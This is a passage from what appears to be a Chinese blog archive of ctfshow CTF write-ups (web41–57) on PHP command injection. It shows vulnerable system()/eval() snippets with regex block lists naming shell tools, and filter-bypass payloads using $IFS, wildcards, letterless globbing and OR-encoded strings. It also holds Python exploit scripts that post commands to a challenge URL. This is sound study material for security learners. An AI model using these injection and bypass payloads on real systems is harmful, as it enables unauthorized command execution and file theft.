<span id="more"></span>
<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>相较50过滤了更多东西，尤其是tac 。。。泪目</p>
<p>payload：<code>nl&lt;fl\ag.php||</code></p>
<p>上一题的payload依旧能过</p>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>整上一题的payload，发现&lt;被过滤了，且$放出来了。于是把&lt;换成$IFS，出了假flag。构筑payload查一下根目录先：<code>ls$IFS/||</code></p>
<p>发现根目录下有个flag，于是nl查看，出答案</p>
<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>。。。？不用||命令分隔了，直接上payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</span><br><span class="line">payload2:c&#x3D;nl$IFS\fla\g.php</span><br></pre></td></tr></table></figure>
<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><h3 id="1、题目："><a href="#1、题目：" class="headerlink" title="1、题目："></a>1、题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:?c&#x3D;&#x2F;bin&#x2F;c??$&#123;IFS&#125;????????</span><br><span class="line">payload2:?c&#x3D;grep$&#123;IFS&#125;%27&#123;%27$&#123;IFS&#125;fl???php</span><br></pre></td></tr></table></figure>
<h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>ban了字母，走一波、<code>c=/???/????64 ????????</code>，得到base64解码拿到flag。</p>
<p>羽师傅解法：<code>payload：?c=/???/???/????2 ????.??? ---》 然后在url + /flag.php.bz2</code></p>
<h4 id="知识点：无字母数字命令执行"><a href="#知识点：无字母数字命令执行" class="headerlink" title="知识点：无字母数字命令执行"></a>知识点：无字母数字命令执行</h4><p>由于base64不是每台机器都装的，因此还有更猛一点的解法。参考P神博客：</p>
<blockquote>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
</blockquote>
<p>还有firebasky：</p>
<blockquote>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
</blockquote>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p>演示一遍无字母数字的getshell</p>
<p>先贴上Y4大佬的一把梭脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://da59fd11-9b26-4f20-b6f4-f86163f58cdd.challenge.ctf.show:8080/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;1.php&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>然后是标准的做法：</p>
<p>先自己搞一个文件上传的接口(html)：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;题目链接&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后抓包传文件：</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531340330-6422cecd-f019-4912-8ad2-d633203171d8.png" alt="image-20210417103026086"></p>
<p>读flag：</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531416858-e2614f2a-f566-439e-9555-9d1bde4b002e.png" alt="image-20210417103131530-1618893972759.png"></p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><h3 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>看不懂看不懂看不懂，全过滤了还怎么打</p>
<p>题目思路：全过滤了，拼接处36这个数字</p>
<p>引用Y4博客：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(())------是-1</span><br><span class="line">$((~37))------是36</span><br><span class="line">所以我们只需要保证中间是-37即可，</span><br><span class="line">$((~$(())$(())))---是1</span><br><span class="line">所以</span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))代表36，即可获取flag</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行41-50</title>
    <url>/2021/04/13/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C41-50/</url>
    <content><![CDATA[<h1 id="ctfshow命令执行篇41-50"><a href="#ctfshow命令执行篇41-50" class="headerlink" title="ctfshow命令执行篇41-50"></a>ctfshow命令执行篇41-50</h1><p>ctfshow中web入门命令执行篇的一些刷题笔记</p>
<span id="more"></span>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>羽师傅的博客：</p>
<blockquote>
<p><a href="https://blog.csdn.net/miuzzx/article/details/108569080?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108569080?spm=1001.2014.3001.5501</a></p>
</blockquote>
<p>这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。<br>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p>
<p>构筑rce_or.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
<p>运行后得到txt文件</p>
<p>接下来构筑exp.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>cmd中执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python exp.py &lt;url&gt;</span><br></pre></td></tr></table></figure>
<p>分别执行：</p>
<p>system；ls</p>
<p>system；tac flag.php</p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ls;ls  <span class="comment">//查看当前目录下文件，前一个ls执行，后一个被丢弃。等同于ls;</span></span><br><span class="line">?c=tac flag.php; <span class="comment">//拿到答案</span></span><br></pre></td></tr></table></figure>
<h4 id="知识点1：Shell脚本————-dev-null-2-gt-amp-1详解"><a href="#知识点1：Shell脚本————-dev-null-2-gt-amp-1详解" class="headerlink" title="知识点1：Shell脚本———— /dev/null 2&gt;&amp;1详解"></a>知识点1：Shell脚本———— /dev/null 2&gt;&amp;1详解</h4><p>参考链接：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/tinywan/p/6025468.html">https://www.cnblogs.com/tinywan/p/6025468.html</a></p>
</blockquote>
<p><strong>可以将/dev/null看作”黑洞”. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong><br>用处:<br>禁止标准输出.  1 cat $filename &gt;/dev/null  # 文件内容丢失，而不会输出到标准输出.<br>禁止标准错误.   2&gt;/dev/null 这样错误信息[标准错误]就被丢到太平洋去了. </p>
<p><strong>1&gt;/dev/null 2&gt;&amp;1的含义</strong> </p>
<p>> 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p>
<p><strong>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</strong></p>
<p>那么本文标题的语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br>2&gt;&amp;1 ：接着，标准错误输出重定向 到 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
<h4 id="知识点2：命令分隔"><a href="#知识点2：命令分隔" class="headerlink" title="知识点2：命令分隔"></a>知识点2：命令分隔</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">;	<span class="comment">//分号</span></span><br><span class="line">|	<span class="comment">//只执行后面那条命令</span></span><br><span class="line">||	<span class="comment">//只执行前面那条命令</span></span><br><span class="line">&amp;	<span class="comment">//两条命令都会执行</span></span><br><span class="line">&amp;&amp;	<span class="comment">//两条命令都会执行</span></span><br><span class="line">    <span class="comment">//注意&amp;符号要进行编码</span></span><br></pre></td></tr></table></figure>
<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><p>多过滤了;和cat，没什么大区别，tac绕一下就行</p>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php||</span><br></pre></td></tr></table></figure>
<h4 id="知识点：读文件绕过"><a href="#知识点：读文件绕过" class="headerlink" title="知识点：读文件绕过"></a>知识点：读文件绕过</h4><p>cat被ban，以下命令可用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><h3 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h3><p>在之前的基础上，多过滤了flag</p>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>通配符绕过，tac f*</p>
<h4 id="知识点：通配符绕过"><a href="#知识点：通配符绕过" class="headerlink" title="知识点：通配符绕过"></a>知识点：通配符绕过</h4><div class="table-container">
<table>
<thead>
<tr>
<th>符号</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td style="text-align:left">匹配任何字符串／文本，包括空字符串；<em>代表任意字符（0个或多个） ls file </em></td>
</tr>
<tr>
<td>?</td>
<td style="text-align:left">匹配任何一个字符（不在括号内时）?代表人意1个字符 ls file 0</td>
</tr>
<tr>
<td>[abcd]</td>
<td style="text-align:left">匹配abcd中任何一个字符</td>
</tr>
<tr>
<td>[a-z]</td>
<td style="text-align:left">表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</td>
</tr>
<tr>
<td>{..}</td>
<td style="text-align:left">表示生成序列。以逗号分隔，且不能有空格</td>
</tr>
<tr>
<td>[!abcd]</td>
<td style="text-align:left">或<sup><a href="#fn_abcd" id="reffn_abcd">abcd</a></sup>表示非，表示不匹配括号里面的任何一个字符</td>
</tr>
</tbody>
</table>
</div>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><h3 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h3><p>在前面的基础上加了空格过滤</p>
<h3 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h3><p>绕空格，PHP环境下 %09过</p>
